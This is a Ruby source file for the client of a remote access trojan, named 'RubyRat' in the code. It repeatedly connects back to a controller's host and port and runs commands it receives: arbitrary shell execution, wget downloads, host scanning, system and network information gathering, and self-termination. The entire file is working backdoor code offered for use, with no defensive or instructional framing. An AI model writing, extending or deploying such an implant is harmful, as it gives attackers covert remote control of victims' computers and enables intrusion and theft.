# Allows us to require our core libraries
$:.unshift(File.expand_path(File.join(File.dirname(__FILE__), 'lib')))

require 'core'


# Change these to your needs
HOST = '0.0.0.0'
PORT = 4567
@platform = nil
# Communications timeout
TIMEOUT = 30

case RUBY_PLATFORM
  when /mswin|windows/i
    @platform = 'win'
  when /linux|arch/i
    @platform = 'nix'
  when /sunos|solaris/i
    @platform = 'solaris'
  when /darwin/i
    @platform = 'osx'
  else
    puts 'This platform is not supported' if ARGV.include? 'DEBUG'
end

puts RUBY_PLATFORM if ARGV.include? 'DEBUG'
# Main loop the client goes through
def client_loop(conn)

  # Old failed crypto comms, will re-implement later
  #f = File.read('/tmp/rratkey.dat').split("\n")
  #@key = f[0]
  #puts "Key: #{@key}"
  #@iv = f[1]
  #puts "IV: #{@iv}"

  while true
    results = ''
    # Recieve and decrypt AES encrypted message
    #data = AES.decrypt(conn.read(64).gsub!("0", ''), @key)
    data = conn.read(64).gsub!('0', '')
    puts data
    cmd, action = data.split ' '  # Split data into command and action

    # Interpret the command
    case cmd
    when 'kill'
      conn.close
      exit 0
    when 'quit'
      conn.shutdown(:WRDR)
      conn.close
      break
    when 'scan'
      results = RubyRat::Tools.scan_single_host(action)
    when 'sysinfo'
      results = RubyRat::Tools.sysinfo
    when 'pwd'
      results = RubyRat::Tools.pwd
    when 'wget'
      results = RubyRat::Tools.wget(action)
    when 'getpid'
      results = "Current process: #{RubyRat::Tools.pid}"
    when 'ifconfig'
      results = RubyRat::Tools.ifconfig(@platform)
    when 'execute'
      results = RubyRat::Tools.execute(data.gsub('execute ', ''))
    end
    # TODO add more stuff
    #end
    results << "\n#{cmd} completed."
    puts results if ARGV.include? 'DEBUG'
    conn.puts results.length
    conn.write(results)
  end
end

def main
  status = 0

  while true
    sock = nil
    begin
      # Try to connect to the server
      sock = TCPSocket.new(HOST, PORT)
    rescue Errno::ECONNREFUSED, Errno::ECONNRESET => e
      puts "Sleeping for #{TIMEOUT}" if ARGV.include? 'DEBUG'
      sleep(TIMEOUT)
    end

    begin
      status = client_loop sock
    rescue Interrupt
      exit
    rescue Exception => e
      puts e.to_s.red
      puts e.message.red
      puts e.backtrace.join("\n").red if ARGV.include?('DEBUG')  # Make things easier to debug
      next
    end

    if status
      exit 0
    end

  end
end

main
